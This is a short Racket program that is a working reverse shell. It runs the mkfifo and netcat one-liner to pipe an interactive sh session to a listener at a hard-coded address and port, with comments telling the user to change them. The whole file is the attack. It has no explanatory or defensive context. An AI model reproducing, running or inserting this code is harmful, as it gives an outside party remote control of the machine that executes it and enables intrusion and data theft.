#lang racket
(require racket/system)

(define ip-addr
  "192.168.122.1") ;change this
(define port
  4444) ;change this

(system
 (string-join (list "rm /tmp/f;"
                "mkfifo /tmp/f;"
                "cat /tmp/f | sh -i 2>&1 | nc"
                ip-addr
                (number->string port)
                ">/tmp/f")
              " "))
